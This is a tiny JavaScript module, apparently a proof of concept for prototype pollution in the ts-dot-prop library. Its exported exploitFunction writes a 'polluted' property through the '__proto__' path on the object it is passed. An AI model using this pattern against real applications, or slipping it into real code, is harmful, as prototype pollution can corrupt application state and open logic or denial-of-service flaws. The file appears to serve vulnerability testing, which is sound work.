function exploitFunction(payload) {
    const tsDot = require("ts-dot-prop");

    const obj = payload.obj;
    tsDot.set(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };